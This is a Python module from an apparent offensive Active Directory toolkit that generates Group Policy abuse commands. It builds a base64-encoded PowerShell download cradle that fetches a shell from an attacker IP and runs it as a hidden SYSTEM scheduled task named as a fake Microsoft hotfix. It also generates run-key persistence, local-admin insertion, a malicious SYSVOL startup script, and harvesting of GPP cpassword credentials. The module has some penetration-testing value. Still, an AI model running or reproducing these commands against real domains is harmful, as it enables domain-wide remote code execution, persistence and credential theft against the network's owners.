"""
Module: GPO Abuse
Techniques: Create/link GPO, RunKey, SharpGPOAbuse, Restricted Groups, Startup Script
"""
from utils.helpers import *
from config.settings import SESSION
import base64

def run():
    print_banner("GPO ABUSE", "Group Policy Object Exploitation")
    dom  = input_or_session("domain",   "Domain")
    dc   = input_or_session("dc_ip",    "DC IP")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print(f"""
  [1]  Create & Link GPO to OU
  [2]  Registry RunKey via GPO (exec on reboot)
  [3]  Immediate Scheduled Task (SharpGPOAbuse)
  [4]  Add Local Admin via GPO Restricted Groups
  [5]  Startup Script via GPO
  [6]  Find GPO Delegation
  [7]  GPO Enumeration + GPP Passwords
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        gpo_name  = prompt("GPO name") or "Totally Legit GPO"
        target_ou = prompt("Target OU DN (e.g. OU=Servers,DC=corp,DC=local)")
        print(f"""
  {Y}Create & Link GPO (RSAT PowerShell):{RST}
  New-GPO -Name '{gpo_name}' | New-GPLink -Target '{target_ou}'

  {Y}Link additional OU:{RST}
  New-GPLink -Target '<OU2_DN>' -Name '{gpo_name}'

  {Y}Force refresh:{RST}
  Invoke-GPUpdate -Computer <target> -Force -RandomDelayInMinutes 0
""")

    elif c == "2":
        gpo_name = prompt("GPO name")
        cmd      = prompt("Command (e.g. cmd.exe /c calc.exe)")
        val_name = prompt("Registry value name") or "Updater"
        print(f"""
  {Y}Registry RunKey via GPO:{RST}
  Set-GPPrefRegistryValue -Name '{gpo_name}' -Context Computer -Action Create \\
    -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' \\
    -ValueName '{val_name}' -Value '{cmd}' -Type ExpandString

  {Y}User context:{RST}
  Set-GPPrefRegistryValue -Name '{gpo_name}' -Context User -Action Create \\
    -Key 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' \\
    -ValueName '{val_name}' -Value '{cmd}' -Type ExpandString
""")
        add_finding("GPO RunKey Persistence", "Critical",
                    f"RunKey deployed via GPO '{gpo_name}'",
                    "Audit GPO permissions; monitor GPO modifications")

    elif c == "3":
        gpo_name  = prompt("Existing GPO name")
        task_name = prompt("Task name") or "Microsoft LEGITIMATE Hotfix"
        attacker  = prompt("Attacker IP")
        raw = f'IEX ((new-object net.webclient).downloadstring("http://{attacker}/shell.ps1"))'
        b64 = base64.b64encode(raw.encode('utf-16-le')).decode()
        print(f"""
  {Y}SharpGPOAbuse — Immediate Scheduled Task:{RST}
  SharpGPOAbuse.exe --AddComputerTask \\
    --TaskName "{task_name}" \\
    --Author "NT AUTHORITY\\SYSTEM" \\
    --Command "powershell.exe" \\
    --Arguments "-nop -w hidden -enc {b64}" \\
    --GPOName "{gpo_name}"

  {Y}Force trigger:{RST}
  gpupdate /force
""")
        add_finding("GPO Immediate Task", "Critical",
                    f"Payload deployed via GPO '{gpo_name}'",
                    "Monitor Event ID 4698; audit GPO task deployments")

    elif c == "4":
        gpo_name   = prompt("GPO name")
        admin_user = prompt("User to add as local admin")
        print(f"""
  {Y}Add Local Admin via Restricted Groups:{RST}
  SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {admin_user} --GPOName "{gpo_name}"
""")
        add_finding("GPO Local Admin", "Critical",
                    f"{admin_user} added as admin via GPO",
                    "Audit Restricted Groups GPO settings")

    elif c == "5":
        gpo_name = prompt("GPO name")
        script   = prompt("Script name (must be on SYSVOL)")
        print(f"""
  {Y}Startup Script via GPO:{RST}
  SharpGPOAbuse.exe --AddComputerScript \\
    --ScriptName "{script}" \\
    --ScriptContents "powershell -c <cmd>" \\
    --GPOName "{gpo_name}"

  {Y}Copy script to SYSVOL:{RST}
  Copy-Item .\\evil.ps1 \\\\{dom}\\SYSVOL\\{dom}\\scripts\\{script}
""")

    elif c == "6":
        base_dn = "DC=" + dom.replace(".", ",DC=")
        print(f"""
  {Y}Find who can create new GPOs:{RST}
  Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,{base_dn}" -ResolveGUIDs |
    ?{{$_.ObjectAceType -eq "Group-Policy-Container"}} |
    select ObjectDN,ActiveDirectoryRights,SecurityIdentifier

  {Y}Find who can link GPOs to OUs:{RST}
  Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
    ?{{$_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty"}} |
    select ObjectDN,SecurityIdentifier
""")

    elif c == "7":
        print(f"""
  {Y}GPO Enumeration:{RST}
  Get-DomainGPO
  Get-DomainGPO | select displayname,gpcfilesyspath
  Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName,GroupName,GroupMembers

  {Y}GPP Passwords (SYSVOL):{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' -M gpp_password
  crackmapexec smb {dc} -u '{user}' -p '{pw}' -M gpp_autologin

  # Manual SYSVOL search:
  findstr /S /I "cpassword" \\\\{dom}\\SYSVOL\\{dom}\\Policies\\*
""")

    pause()
